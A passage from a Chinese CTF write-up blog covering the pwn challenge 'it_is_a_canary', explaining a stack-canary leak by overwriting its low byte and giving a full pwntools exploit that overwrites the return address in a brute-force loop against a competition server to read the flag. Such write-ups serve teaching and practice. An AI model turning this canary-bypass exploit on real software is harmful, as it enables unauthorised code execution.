<p>第一步，泄露 canary，将 canary 的最低位替换为 &#39;W&#39;，再通过 recv()<br>读回输出，反推出原 canary。因为 canary 的最低字节通常是<br>\x00，这样可以方便泄露完整值。</p>
<p>第二步，构造 payload 利用 canary 通过检查，b&#39;b&#39;*0x18：填满栈缓冲；</p>
<p>p64(canary)：正确的 canary 防止检测失败；p64(0)：覆盖旧的 rbp；</p>
<p>b&#39;\x53\x52&#39;：覆盖返回地址（构造<br>ROP）。这是伪造的地址，猜测可能落在程序中某个成功打印 flag<br>的函数处（或简陋 shell）。</p>
<p>写出脚本运行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956863.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.858135389326334in”}</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>from pwn import *</p>
<p>filename &#x3D; &#39;.&#x2F;it_is_a_canary&#39;</p>
<p>url &#x3D; &#39;27.25.151.26:30726&#39;</p>
<p>gdbscript &#x3D; &#39;&#39;&#39;</p>
<p>b * 0x000000000000130C</p>
<p>&#39;&#39;&#39;</p>
<p># 设置上下文信息</p>
<p>context(log_level&#x3D;&#39;debug&#39;, arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;,<br>endian&#x3D;&#39;little&#39;, timeout&#x3D;5)</p>
<p>elf &#x3D; ELF(filename)</p>
<p>def connect(url, filename):</p>
<p>if url:</p>
<p>host, port &#x3D; url.split(&#39;:&#39;)</p>
<p>return remote(host, int(port))</p>
<p>else:</p>
<p>return process(filename)</p>
<p>while True:</p>
<p>p &#x3D; connect(url, filename)</p>
<p>payload &#x3D; b&#39;a&#39; * 0x18 + b&#39;W&#39;</p>
<p>p.sendafter(&quot;Is it a canary?&quot;, payload)</p>
<p>p.recvuntil(b&quot;a&quot; * 0x18)</p>
<p>canary &#x3D; u64(p.recv(8)) - ord(&quot;W&quot;)</p>
<p>log.success(f&quot;Found canary: {hex(canary)}&quot;)</p>
<p>try:</p>
<p>payload &#x3D; b&#39;b&#39; * 0x18 + p64(canary) + p64(0) + b&#39;\x53\x52&#39;</p>
<p>p.send(payload)</p>
<p># 若成功回显，会进入下方逻辑</p>
<p>p.recvuntil(&quot;You get it!&quot;, timeout&#x3D;0.5)</p>
<p>p.sendline(&quot;cat flag&quot;)</p>
<p>break</p>
<p>except:</p>
<p>p.close()</p>
<p>continue</p>
<p>p.interactive()</p>

		</div>

		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/05/23/%E5%BE%A1%E7%BD%91%E6%9D%AFwp/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">御网杯wp</span>
						<span class="post-nav-item">上一篇</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/04/14/RC4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">RC4加密解密</span>
						<span class="post-nav-item">下一篇</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">目录</div>
		<div class="page-title">轩辕杯wp</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezjs"><span class="nav-number">1.1.</span> <span class="nav-text">ezjs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezflask"><span class="nav-number">1.2.</span> <span class="nav-text">ezflask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezrce"><span class="nav-number">1.3.</span> <span class="nav-text">ezrce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.4.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezssrf1-0"><span class="nav-number">1.5.</span> <span class="nav-text">ezssrf1.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-web1"><span class="nav-number">1.6.</span> <span class="nav-text">ez_web1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Terminal-Hacker"><span class="nav-number">2.1.</span> <span class="nav-text">Terminal Hacker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%87%E5%93%87%E5%93%87%E7%93%A6"><span class="nav-number">2.2.</span> <span class="nav-text">哇哇哇瓦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9F%B3%E9%A2%91%E7%9A%84%E7%A7%98%E5%AF%86"><span class="nav-number">2.3.</span> <span class="nav-text">音频的秘密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E8%AF%86%E5%88%AB%E4%B8%8E%E5%AE%A1%E8%AE%A1"><span class="nav-number">2.4.</span> <span class="nav-text">数据识别与审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pdf"><span class="nav-number">2.4.1.</span> <span class="nav-text">pdf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#txt"><span class="nav-number">2.4.2.</span> <span class="nav-text">txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wav"><span class="nav-number">2.4.3.</span> <span class="nav-text">wav</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#png"><span class="nav-number">2.4.4.</span> <span class="nav-text">png</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezBase"><span class="nav-number">3.0.1.</span> <span class="nav-text">ezBase</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%A0%E7%9F%A5%E9%81%93base%E5%90%97"><span class="nav-number">3.0.2.</span> <span class="nav-text">你知道base吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hookme"><span class="nav-number">3.0.3.</span> <span class="nav-text">hookme</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">5.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-lllibc"><span class="nav-number">5.1.</span> <span class="nav-text">1.lllibc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="nav-number">5.1.1.</span> <span class="nav-text">解题思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">5.1.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#it-is-a-canary"><span class="nav-number">5.2.</span> <span class="nav-text">it_is_a_canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-2"><span class="nav-number">5.2.1.</span> <span class="nav-text">解题思路：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">5.2.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">whyy</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共撰写了 8 篇文章
                    </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>





  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>










    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>